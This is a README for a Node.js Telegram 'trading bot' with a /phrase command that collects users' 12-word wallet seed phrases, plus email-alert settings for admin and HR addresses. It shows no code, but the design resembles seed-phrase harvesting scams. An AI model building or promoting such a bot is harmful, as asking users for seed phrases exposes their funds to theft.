# Telegram Trading Bot

A robust Telegram Trading Bot built with Node.js, Express, and MongoDB. This bot allows users to manage their crypto trades, import wallets, and customize settings directly from Telegram.

## Features

- **Wallet Management**: Import wallets securely via 12-word seed phrase.
- **Trading Tools**: View trades and manage positions.
- **Bot Customization**: personalized settings for your trading experience.
- **Backup Bots**: Setup backup bots with the same wallet and path.
- **Group Integration**: Support for joining Telegram groups.
- **Production Ready**: Supports both Polling (Development) and Webhook (Production) modes.
- **Database Integration**: Persists user data and settings using MongoDB.
- **Email Notifications**: integrated with SendGrid/Nodemailer for alerts.

## Bot Commands

The bot responds to the following commands:

| Command | Description |
| :--- | :--- |
| `/start` | Start the bot |
| `/home` | View trades and open main menu |
| `/settings` | Customize your bot |
| `/bots` | Fast backup bots, same wallet & positions |
| `/phrase` | Import wallet via 12 key phrase |
| `/help` | Tips and frequently asked questions |
| `/chat` | Join our telegram group for questions and feedback |

## Prerequisites

Before running the project, ensure you have the following installed:

- [Node.js](https://nodejs.org/) (v16 or higher recommended)
- [MongoDB](https://www.mongodb.com/) (Local or Atlas)
- A [Telegram Bot Token](https://core.telegram.org/bots#6-botfather) obtained from BotFather

## Installation

1.  **Clone the repository** (if applicable) or navigate to the project directory.

2.  **Install dependencies**:
    ```bash
    npm install
    ```

3.  **Environment Configuration**:
    Create a `.env.development.local` file in the root directory for development.
    
    Required Environment Variables:

    ```env
    # Server Config
    PORT=3000
    NODE_ENV=development

    # Database
    MONGO_URI=mongodb://localhost:27017/your_db_name

    # Telegram Bot
    BOT_TOKEN=your_telegram_bot_token

    # Webhook (Production Only)
    WEBHOOK_URL=https://your-domain.com
    WEBHOOK_SECRET_PATH=your_secret_path

    # Email Service
    HR_EMAIL=hr@example.com
    ADMIN_EMAIL=admin@example.com
    ADMIN_EMAIL_PASS=your_email_password
    ADMIN_PASSWORD=admin_dashboard_password
    ```

## Running the Bot

### Development Mode
Runs the bot in **polling mode** (no SSL/HTTPS required). Auto-reloads on file changes using `nodemon`.

```bash
npm run dev
```

### Production Mode
Runs the bot in **webhook mode**. Requires a valid SSL URL (HTTPS) configured in `WEBHOOK_URL`.

```bash
npm start
```

*Note: In production, the bot listens for updates via the configured Webhook URL.*

## Project Structure

- `index.js`: Main entry point. Initializes server and bot.
- `handlers/`: Contains logic for different bot events (commands, messages, systems).
- `config/`: Configuration files and environment variable management.
- `db/`: Database connection and Mongoose models.
- `helpers/`: Utility functions (e.g., email verification).
- `public/`: Static assets (if any).

## Tech Stack

- **Runtime**: Node.js
- **Framework**: Express.js
- **Database**: MongoDB (Mongoose)
- **Bot API**: `node-telegram-bot-api`
- **Email**: Nodemailer, @sendgrid/mail
